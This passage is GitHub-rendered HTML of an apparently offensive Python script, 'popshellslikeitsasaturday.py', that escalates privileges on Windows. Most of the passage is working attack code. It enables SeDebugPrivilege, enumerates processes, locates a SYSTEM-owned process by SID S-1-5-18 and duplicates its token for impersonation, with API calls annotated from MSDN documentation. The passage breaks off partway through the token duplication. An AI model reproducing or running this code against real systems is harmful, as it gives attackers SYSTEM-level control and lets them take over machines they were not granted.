        <td id="file-popshellslikeitsasaturday-py-LC351" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">INVALID_HANDLE_VALUE</span> <span class="pl-k">=</span> c_void_p(<span class="pl-k">-</span><span class="pl-c1">1</span>).value</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L352" class="blob-num js-line-number" data-line-number="352"></td>
        <td id="file-popshellslikeitsasaturday-py-LC352" class="blob-code blob-code-inner js-file-line"><span class="pl-k">def</span> <span class="pl-en">getsedebugprivilege</span>():</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L353" class="blob-num js-line-number" data-line-number="353"></td>
        <td id="file-popshellslikeitsasaturday-py-LC353" class="blob-code blob-code-inner js-file-line">    hToken <span class="pl-k">=</span> HANDLE(<span class="pl-c1">INVALID_HANDLE_VALUE</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L354" class="blob-num js-line-number" data-line-number="354"></td>
        <td id="file-popshellslikeitsasaturday-py-LC354" class="blob-code blob-code-inner js-file-line">    knackcrack <span class="pl-k">=</span> OpenProcessToken(</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L355" class="blob-num js-line-number" data-line-number="355"></td>
        <td id="file-popshellslikeitsasaturday-py-LC355" class="blob-code blob-code-inner js-file-line">                                  GetCurrentProcess(),                   <span class="pl-c"><span class="pl-c">#</span> _In_      ProcessHandle        A handle to the process whose access token is opened. The process must have the PROCESS_QUERY_INFORMATION access permission.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L356" class="blob-num js-line-number" data-line-number="356"></td>
        <td id="file-popshellslikeitsasaturday-py-LC356" class="blob-code blob-code-inner js-file-line">                                 (<span class="pl-c1">TOKEN_ADJUST_PRIVILEGES</span> <span class="pl-k">|</span> <span class="pl-c1">TOKEN_QUERY</span>),<span class="pl-c"><span class="pl-c">#</span> _In_      DesiredAccess        Specifies an access mask that specifies the requested types of access to the access token. These requested access types are compared with the discretionary access control list (DACL) of the token to determine which accesses are granted or denied.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L357" class="blob-num js-line-number" data-line-number="357"></td>
        <td id="file-popshellslikeitsasaturday-py-LC357" class="blob-code blob-code-inner js-file-line">                                  byref(hToken))                         <span class="pl-c"><span class="pl-c">#</span> _Out_     TokenHandle          A pointer to a handle that identifies the newly opened access token when the function returns.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L358" class="blob-num js-line-number" data-line-number="358"></td>
        <td id="file-popshellslikeitsasaturday-py-LC358" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> knackcrack <span class="pl-k">==</span> <span class="pl-c1">0</span>:</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L359" class="blob-num js-line-number" data-line-number="359"></td>
        <td id="file-popshellslikeitsasaturday-py-LC359" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">raise</span> <span class="pl-c1">RuntimeError</span>(<span class="pl-s"><span class="pl-pds">&quot;</span>Error while grabbing GetCurrentProcess()&#39;s token: <span class="pl-c1">%s</span><span class="pl-pds">&quot;</span></span> <span class="pl-k">%</span>GetLastError())</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L360" class="blob-num js-line-number" data-line-number="360"></td>
        <td id="file-popshellslikeitsasaturday-py-LC360" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">SE_DEBUG_NAME</span>    <span class="pl-k">=</span> <span class="pl-c1">20</span>                                             <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/cc223143.aspx | more information -&gt; https://doxygen.reactos.org/d2/d01/ndk_2setypes_8h_source.html</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L361" class="blob-num js-line-number" data-line-number="361"></td>
        <td id="file-popshellslikeitsasaturday-py-LC361" class="blob-code blob-code-inner js-file-line">    tp               <span class="pl-k">=</span> TOKEN_PRIVILEGES()</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L362" class="blob-num js-line-number" data-line-number="362"></td>
        <td id="file-popshellslikeitsasaturday-py-LC362" class="blob-code blob-code-inner js-file-line">    tp.PrivilegeCount<span class="pl-k">=</span> <span class="pl-c1">1</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L363" class="blob-num js-line-number" data-line-number="363"></td>
        <td id="file-popshellslikeitsasaturday-py-LC363" class="blob-code blob-code-inner js-file-line">    tp.Privileges    <span class="pl-k">=</span> (<span class="pl-c1">SE_DEBUG_NAME</span>, <span class="pl-c1">0</span>, <span class="pl-c1">SE_PRIVILEGE_ENABLED</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L364" class="blob-num js-line-number" data-line-number="364"></td>
        <td id="file-popshellslikeitsasaturday-py-LC364" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/aa374909(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L365" class="blob-num js-line-number" data-line-number="365"></td>
        <td id="file-popshellslikeitsasaturday-py-LC365" class="blob-code blob-code-inner js-file-line">    knackcrack666 <span class="pl-k">=</span> AdjustTokenPrivileges(</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L366" class="blob-num js-line-number" data-line-number="366"></td>
        <td id="file-popshellslikeitsasaturday-py-LC366" class="blob-code blob-code-inner js-file-line">                            hToken,                                      <span class="pl-c"><span class="pl-c">#</span> _In_      TokenHandle          A handle to the access token that contains the privileges to be modified. The handle must have TOKEN_ADJUST_PRIVILEGES access to the token. If the PreviousState parameter is not NULL, the handle must also have TOKEN_QUERY access.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L367" class="blob-num js-line-number" data-line-number="367"></td>
        <td id="file-popshellslikeitsasaturday-py-LC367" class="blob-code blob-code-inner js-file-line">                            <span class="pl-c1">False</span>,                                       <span class="pl-c"><span class="pl-c">#</span> _In_      DisableAllPrivileges Specifies whether the function disables all of the token&#39;s privileges. If this value is TRUE, the function disables all privileges and ignores the NewState parameter. If it is FALSE, the function modifies privileges based on the information pointed to by the NewState parameter.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L368" class="blob-num js-line-number" data-line-number="368"></td>
        <td id="file-popshellslikeitsasaturday-py-LC368" class="blob-code blob-code-inner js-file-line">                            byref(tp),                                   <span class="pl-c"><span class="pl-c">#</span> _In_opt_  NewState             A pointer to a TOKEN_PRIVILEGES structure that specifies an array of privileges and their attributes. If the DisableAllPrivileges parameter is FALSE, the AdjustTokenPrivileges function enables, disables, or removes these privileges for the token. If DisableAllPrivileges is TRUE, the function ignores this parameter.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L369" class="blob-num js-line-number" data-line-number="369"></td>
        <td id="file-popshellslikeitsasaturday-py-LC369" class="blob-code blob-code-inner js-file-line">                            <span class="pl-c1">0</span>,                                           <span class="pl-c"><span class="pl-c">#</span> _In_      BufferLength         Specifies the size, in bytes, of the buffer pointed to by the PreviousState parameter. This parameter can be zero if the PreviousState parameter is NULL.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L370" class="blob-num js-line-number" data-line-number="370"></td>
        <td id="file-popshellslikeitsasaturday-py-LC370" class="blob-code blob-code-inner js-file-line">                            <span class="pl-c1">None</span>,                                        <span class="pl-c"><span class="pl-c">#</span> _Out_opt_ PreviousState        A pointer to a buffer that the function fills with a TOKEN_PRIVILEGES structure that contains the previous state of any privileges that the function modifies. That is, if a privilege has been modified by this function, the privilege and its previous state are contained in the TOKEN_PRIVILEGES structure referenced by PreviousState. If the PrivilegeCount member of TOKEN_PRIVILEGES is zero, then no privileges have been changed by this function. This parameter can be NULL</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L371" class="blob-num js-line-number" data-line-number="371"></td>
        <td id="file-popshellslikeitsasaturday-py-LC371" class="blob-code blob-code-inner js-file-line">                            <span class="pl-c1">None</span>)                                        <span class="pl-c"><span class="pl-c">#</span> _Out_opt_ ReturnLength         A pointer to a variable that receives the required size, in bytes, of the buffer pointed to by the PreviousState parameter. This parameter can be NULL if PreviousState is NULL.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L372" class="blob-num js-line-number" data-line-number="372"></td>
        <td id="file-popshellslikeitsasaturday-py-LC372" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> knackcrack666 <span class="pl-k">==</span> <span class="pl-c1">0</span>:</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L373" class="blob-num js-line-number" data-line-number="373"></td>
        <td id="file-popshellslikeitsasaturday-py-LC373" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">raise</span> <span class="pl-c1">RuntimeError</span>(<span class="pl-s"><span class="pl-pds">&quot;</span>Error while assigning SE_DEBUG_NAME to GetCurrentProcess()&#39;s token&#39;: <span class="pl-c1">%s</span><span class="pl-pds">&quot;</span></span> <span class="pl-k">%</span>GetLastError())</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L374" class="blob-num js-line-number" data-line-number="374"></td>
        <td id="file-popshellslikeitsasaturday-py-LC374" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L375" class="blob-num js-line-number" data-line-number="375"></td>
        <td id="file-popshellslikeitsasaturday-py-LC375" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L376" class="blob-num js-line-number" data-line-number="376"></td>
        <td id="file-popshellslikeitsasaturday-py-LC376" class="blob-code blob-code-inner js-file-line"><span class="pl-k">if</span> areAdminRightsEnabled():</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L377" class="blob-num js-line-number" data-line-number="377"></td>
        <td id="file-popshellslikeitsasaturday-py-LC377" class="blob-code blob-code-inner js-file-line">    getsedebugprivilege()</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L378" class="blob-num js-line-number" data-line-number="378"></td>
        <td id="file-popshellslikeitsasaturday-py-LC378" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">&quot;</span>[+] Enabling SeDebugPrivilege<span class="pl-pds">&quot;</span></span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L379" class="blob-num js-line-number" data-line-number="379"></td>
        <td id="file-popshellslikeitsasaturday-py-LC379" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ms682623(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L380" class="blob-num js-line-number" data-line-number="380"></td>
        <td id="file-popshellslikeitsasaturday-py-LC380" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">DWORD_array</span>        <span class="pl-k">=</span> (<span class="pl-c1">DWORD</span> <span class="pl-k">*</span>  <span class="pl-c1"><span class="pl-k">0x</span>FFFF</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L381" class="blob-num js-line-number" data-line-number="381"></td>
        <td id="file-popshellslikeitsasaturday-py-LC381" class="blob-code blob-code-inner js-file-line">    ProcessIds         <span class="pl-k">=</span> DWORD_array()</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L382" class="blob-num js-line-number" data-line-number="382"></td>
        <td id="file-popshellslikeitsasaturday-py-LC382" class="blob-code blob-code-inner js-file-line">    ProcessIdsSize     <span class="pl-k">=</span> sizeof(ProcessIds)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L383" class="blob-num js-line-number" data-line-number="383"></td>
        <td id="file-popshellslikeitsasaturday-py-LC383" class="blob-code blob-code-inner js-file-line">    ProcessesReturned  <span class="pl-k">=</span> DWORD()                                      <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ms682623(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L384" class="blob-num js-line-number" data-line-number="384"></td>
        <td id="file-popshellslikeitsasaturday-py-LC384" class="blob-code blob-code-inner js-file-line">    EnumProcesses(</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L385" class="blob-num js-line-number" data-line-number="385"></td>
        <td id="file-popshellslikeitsasaturday-py-LC385" class="blob-code blob-code-inner js-file-line">                               ProcessIds,                               <span class="pl-c"><span class="pl-c">#</span> _Out_  pProcessIds        A pointer to an array that receives the list of process identifiers.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L386" class="blob-num js-line-number" data-line-number="386"></td>
        <td id="file-popshellslikeitsasaturday-py-LC386" class="blob-code blob-code-inner js-file-line">                               ProcessIdsSize,                           <span class="pl-c"><span class="pl-c">#</span> _In_   cb                 The size of the pProcessIds array, in bytes.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L387" class="blob-num js-line-number" data-line-number="387"></td>
        <td id="file-popshellslikeitsasaturday-py-LC387" class="blob-code blob-code-inner js-file-line">                               ProcessesReturned)                        <span class="pl-c"><span class="pl-c">#</span> _Out_  pBytesReturned     The number of bytes returned in the pProcessIds array.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L388" class="blob-num js-line-number" data-line-number="388"></td>
        <td id="file-popshellslikeitsasaturday-py-LC388" class="blob-code blob-code-inner js-file-line">    foundSystemprocess <span class="pl-k">=</span> <span class="pl-c1">False</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L389" class="blob-num js-line-number" data-line-number="389"></td>
        <td id="file-popshellslikeitsasaturday-py-LC389" class="blob-code blob-code-inner js-file-line">    RunningProcesses <span class="pl-k">=</span> ProcessesReturned.value <span class="pl-k">/</span> sizeof(<span class="pl-c1">DWORD</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L390" class="blob-num js-line-number" data-line-number="390"></td>
        <td id="file-popshellslikeitsasaturday-py-LC390" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> process <span class="pl-k">in</span> <span class="pl-c1">range</span>(RunningProcesses):</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L391" class="blob-num js-line-number" data-line-number="391"></td>
        <td id="file-popshellslikeitsasaturday-py-LC391" class="blob-code blob-code-inner js-file-line">        ProcessId <span class="pl-k">=</span> ProcessIds[process]</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L392" class="blob-num js-line-number" data-line-number="392"></td>
        <td id="file-popshellslikeitsasaturday-py-LC392" class="blob-code blob-code-inner js-file-line">        currenthandle <span class="pl-k">=</span> OpenProcess(</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L393" class="blob-num js-line-number" data-line-number="393"></td>
        <td id="file-popshellslikeitsasaturday-py-LC393" class="blob-code blob-code-inner js-file-line">                           <span class="pl-c1">PROCESS_QUERY_INFORMATION</span>,                    <span class="pl-c"><span class="pl-c">#</span> _In_  dwDesiredAccess     The access to the process object. This access right is checked against the security descriptor for the process. If the caller has enabled the SeDebugPrivilege privilege, the requested access is granted regardless of the contents of the security descriptor.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L394" class="blob-num js-line-number" data-line-number="394"></td>
        <td id="file-popshellslikeitsasaturday-py-LC394" class="blob-code blob-code-inner js-file-line">                           <span class="pl-c1">False</span>,                                        <span class="pl-c"><span class="pl-c">#</span> _In_  bInheritHandle      If this value is TRUE, processes created by this process will inherit the handle. Otherwise, the processes do not inherit this handle.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L395" class="blob-num js-line-number" data-line-number="395"></td>
        <td id="file-popshellslikeitsasaturday-py-LC395" class="blob-code blob-code-inner js-file-line">                           ProcessId)                                    <span class="pl-c"><span class="pl-c">#</span> _In_  dwProcessId         The identifier of the local process to be opened.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L396" class="blob-num js-line-number" data-line-number="396"></td>
        <td id="file-popshellslikeitsasaturday-py-LC396" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> currenthandle:</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L397" class="blob-num js-line-number" data-line-number="397"></td>
        <td id="file-popshellslikeitsasaturday-py-LC397" class="blob-code blob-code-inner js-file-line">            ProcessName <span class="pl-k">=</span> (c_char <span class="pl-k">*</span> <span class="pl-c1">MAX_PATH</span>)()</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L398" class="blob-num js-line-number" data-line-number="398"></td>
        <td id="file-popshellslikeitsasaturday-py-LC398" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> GetProcessImageFileName(</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L399" class="blob-num js-line-number" data-line-number="399"></td>
        <td id="file-popshellslikeitsasaturday-py-LC399" class="blob-code blob-code-inner js-file-line">                           currenthandle,                                <span class="pl-c"><span class="pl-c">#</span> _In_  hProcess            A handle to the process. The handle must have the PROCESS_QUERY_INFORMATION or PROCESS_QUERY_LIMITED_INFORMATION access right.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L400" class="blob-num js-line-number" data-line-number="400"></td>
        <td id="file-popshellslikeitsasaturday-py-LC400" class="blob-code blob-code-inner js-file-line">                           ProcessName,                                  <span class="pl-c"><span class="pl-c">#</span> _Out_ lpImageFileName     A pointer to a buffer that receives the full path to the executable file.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L401" class="blob-num js-line-number" data-line-number="401"></td>
        <td id="file-popshellslikeitsasaturday-py-LC401" class="blob-code blob-code-inner js-file-line">                           <span class="pl-c1">MAX_PATH</span>):                                    <span class="pl-c"><span class="pl-c">#</span> _In_  nSize               The size of the lpImageFileName buffer, in characters.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L402" class="blob-num js-line-number" data-line-number="402"></td>
        <td id="file-popshellslikeitsasaturday-py-LC402" class="blob-code blob-code-inner js-file-line">                ProcessName <span class="pl-k">=</span> ProcessName.value.split(<span class="pl-s"><span class="pl-pds">&quot;</span><span class="pl-cce">\\</span><span class="pl-pds">&quot;</span></span>)[<span class="pl-k">-</span><span class="pl-c1">1</span>]       <span class="pl-c"><span class="pl-c">#</span> Since GetProcessImageFileName function returns the path in device form we grab the process name with split on what&#39;s followed after the last slash. \Device\Harddisk0\Partition1\Windows\System32\wusa.exe -&gt; wusa.exe</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L403" class="blob-num js-line-number" data-line-number="403"></td>
        <td id="file-popshellslikeitsasaturday-py-LC403" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> <span class="pl-k">not</span> foundSystemprocess:</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L404" class="blob-num js-line-number" data-line-number="404"></td>
        <td id="file-popshellslikeitsasaturday-py-LC404" class="blob-code blob-code-inner js-file-line">                    processToken <span class="pl-k">=</span> HANDLE(<span class="pl-c1">INVALID_HANDLE_VALUE</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L405" class="blob-num js-line-number" data-line-number="405"></td>
        <td id="file-popshellslikeitsasaturday-py-LC405" class="blob-code blob-code-inner js-file-line">                    OpenProcessToken(</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L406" class="blob-num js-line-number" data-line-number="406"></td>
        <td id="file-popshellslikeitsasaturday-py-LC406" class="blob-code blob-code-inner js-file-line">                           currenthandle,                                <span class="pl-c"><span class="pl-c">#</span> _In_      ProcessHandle        A handle to the process whose access token is opened. The process must have the PROCESS_QUERY_INFORMATION access permission.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L407" class="blob-num js-line-number" data-line-number="407"></td>
        <td id="file-popshellslikeitsasaturday-py-LC407" class="blob-code blob-code-inner js-file-line">                           tokenprivs,                                   <span class="pl-c"><span class="pl-c">#</span> _In_      DesiredAccess          Specifies an access mask that specifies the requested types of access to the access token. These requested access types are compared with the discretionary access control list (DACL) of the token to determine which accesses are granted or denied.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L408" class="blob-num js-line-number" data-line-number="408"></td>
        <td id="file-popshellslikeitsasaturday-py-LC408" class="blob-code blob-code-inner js-file-line">                           byref(processToken))                          <span class="pl-c"><span class="pl-c">#</span> _Out_     TokenHandle            A pointer to a handle that identifies the newly opened access token when the function returns.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L409" class="blob-num js-line-number" data-line-number="409"></td>
        <td id="file-popshellslikeitsasaturday-py-LC409" class="blob-code blob-code-inner js-file-line">                    TokenInformation <span class="pl-k">=</span> (c_byte <span class="pl-k">*</span> <span class="pl-c1">4096</span>)()              <span class="pl-c"><span class="pl-c">#</span> assume x86 page size</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L410" class="blob-num js-line-number" data-line-number="410"></td>
        <td id="file-popshellslikeitsasaturday-py-LC410" class="blob-code blob-code-inner js-file-line">                    ReturnLength     <span class="pl-k">=</span> DWORD()</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L411" class="blob-num js-line-number" data-line-number="411"></td>
        <td id="file-popshellslikeitsasaturday-py-LC411" class="blob-code blob-code-inner js-file-line">                    GetTokenInformation(</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L412" class="blob-num js-line-number" data-line-number="412"></td>
        <td id="file-popshellslikeitsasaturday-py-LC412" class="blob-code blob-code-inner js-file-line">                           processToken,                                 <span class="pl-c"><span class="pl-c">#</span> _In_      TokenHandle            A handle to an access token from which information is retrieved. If TokenInformationClass specifies TokenSource, the handle must have TOKEN_QUERY_SOURCE access. For all other TokenInformationClass values, the handle must have TOKEN_QUERY access.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L413" class="blob-num js-line-number" data-line-number="413"></td>
        <td id="file-popshellslikeitsasaturday-py-LC413" class="blob-code blob-code-inner js-file-line">                           <span class="pl-c1">TOKEN_INFORMATION_CLASS</span>.TokenUser,            <span class="pl-c"><span class="pl-c">#</span> _In_      TokenInformationClass  Specifies a value from the TOKEN_INFORMATION_CLASS enumerated type to identify the type of information the function retrieves.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L414" class="blob-num js-line-number" data-line-number="414"></td>
        <td id="file-popshellslikeitsasaturday-py-LC414" class="blob-code blob-code-inner js-file-line">                           byref(TokenInformation),                      <span class="pl-c"><span class="pl-c">#</span> _Out_opt_ TokenInformation       A pointer to a buffer the function fills with the requested information. The structure put into this buffer depends upon the type of information specified by the TokenInformationClass parameter.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L415" class="blob-num js-line-number" data-line-number="415"></td>
        <td id="file-popshellslikeitsasaturday-py-LC415" class="blob-code blob-code-inner js-file-line">                           sizeof(TokenInformation),                     <span class="pl-c"><span class="pl-c">#</span> _In_      TokenInformationLength Specifies the size, in bytes, of the buffer pointed to by the TokenInformation parameter. If TokenInformation is NULL, this parameter must be zero.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L416" class="blob-num js-line-number" data-line-number="416"></td>
        <td id="file-popshellslikeitsasaturday-py-LC416" class="blob-code blob-code-inner js-file-line">                           byref(ReturnLength))                          <span class="pl-c"><span class="pl-c">#</span> _Out_     ReturnLength           A pointer to a variable that receives the number of bytes needed for the buffer pointed to by the TokenInformation parameter.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L417" class="blob-num js-line-number" data-line-number="417"></td>
        <td id="file-popshellslikeitsasaturday-py-LC417" class="blob-code blob-code-inner js-file-line">                    Token     <span class="pl-k">=</span> cast(TokenInformation, POINTER(<span class="pl-c1">TOKEN_USER</span>))</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L418" class="blob-num js-line-number" data-line-number="418"></td>
        <td id="file-popshellslikeitsasaturday-py-LC418" class="blob-code blob-code-inner js-file-line">                    StringSid <span class="pl-k">=</span> LPSTR()</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L419" class="blob-num js-line-number" data-line-number="419"></td>
        <td id="file-popshellslikeitsasaturday-py-LC419" class="blob-code blob-code-inner js-file-line">                    ConvertSidToStringSidA(</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L420" class="blob-num js-line-number" data-line-number="420"></td>
        <td id="file-popshellslikeitsasaturday-py-LC420" class="blob-code blob-code-inner js-file-line">                           Token.contents.User.Sid,                      <span class="pl-c"><span class="pl-c">#</span> _In_   Sid           A pointer to the SID structure to be converted.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L421" class="blob-num js-line-number" data-line-number="421"></td>
        <td id="file-popshellslikeitsasaturday-py-LC421" class="blob-code blob-code-inner js-file-line">                           byref(StringSid))                             <span class="pl-c"><span class="pl-c">#</span> _Out_ *StringSid     A pointer to a variable that receives a pointer to a null-terminated SID string.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L422" class="blob-num js-line-number" data-line-number="422"></td>
        <td id="file-popshellslikeitsasaturday-py-LC422" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">if</span> StringSid.value <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&#39;</span>S-1-5-18<span class="pl-pds">&#39;</span></span>:</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L423" class="blob-num js-line-number" data-line-number="423"></td>
        <td id="file-popshellslikeitsasaturday-py-LC423" class="blob-code blob-code-inner js-file-line">                        <span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">&quot;</span>[*] Found system IL process<span class="pl-pds">&quot;</span></span>, ProcessName,<span class="pl-s"><span class="pl-pds">&quot;</span>with PID:<span class="pl-pds">&quot;</span></span>, ProcessId</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L424" class="blob-num js-line-number" data-line-number="424"></td>
        <td id="file-popshellslikeitsasaturday-py-LC424" class="blob-code blob-code-inner js-file-line">                        <span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">&quot;</span><span class="pl-cce">\t</span>[+] Grabbing token<span class="pl-pds">&quot;</span></span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L425" class="blob-num js-line-number" data-line-number="425"></td>
        <td id="file-popshellslikeitsasaturday-py-LC425" class="blob-code blob-code-inner js-file-line">                        foundSystemprocess <span class="pl-k">=</span> <span class="pl-c1">True</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L426" class="blob-num js-line-number" data-line-number="426"></td>
        <td id="file-popshellslikeitsasaturday-py-LC426" class="blob-code blob-code-inner js-file-line">                    hTokendupe <span class="pl-k">=</span> HANDLE(<span class="pl-c1">INVALID_HANDLE_VALUE</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L427" class="blob-num js-line-number" data-line-number="427"></td>
        <td id="file-popshellslikeitsasaturday-py-LC427" class="blob-code blob-code-inner js-file-line">                    knacrack   <span class="pl-k">=</span> DuplicateTokenEx(</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L428" class="blob-num js-line-number" data-line-number="428"></td>
        <td id="file-popshellslikeitsasaturday-py-LC428" class="blob-code blob-code-inner js-file-line">                            processToken,                                <span class="pl-c"><span class="pl-c">#</span> _In_     hExistingToken     A handle to an access token opened with TOKEN_DUPLICATE access.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L429" class="blob-num js-line-number" data-line-number="429"></td>
        <td id="file-popshellslikeitsasaturday-py-LC429" class="blob-code blob-code-inner js-file-line">                            <span class="pl-c1">TOKEN_ALL_ACCESS</span>,                            <span class="pl-c"><span class="pl-c">#</span> _In_     dwDesiredAccess    Specifies the requested access rights for the new token. The DuplicateTokenEx function compares the requested access rights with the existing token&#39;s discretionary access control list (DACL) to determine which rights are granted or denied.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L430" class="blob-num js-line-number" data-line-number="430"></td>
        <td id="file-popshellslikeitsasaturday-py-LC430" class="blob-code blob-code-inner js-file-line">                            <span class="pl-c1">None</span>,                                        <span class="pl-c"><span class="pl-c">#</span> _In_opt_ lpTokenAttributes  A pointer to a SECURITY_ATTRIBUTES structure that specifies a security descriptor for the new token and determines whether child processes can inherit the token.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L431" class="blob-num js-line-number" data-line-number="431"></td>
        <td id="file-popshellslikeitsasaturday-py-LC431" class="blob-code blob-code-inner js-file-line">                      <span class="pl-c1">SECURITY_IMPERSONATION_LEVEL</span>.SecurityImpersonation,<span class="pl-c"><span class="pl-c">#</span> _In_     ImpersonationLevel Specifies a value from the SECURITY_IMPERSONATION_LEVEL enumeration that indicates the impersonation level of the new token.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L432" class="blob-num js-line-number" data-line-number="432"></td>
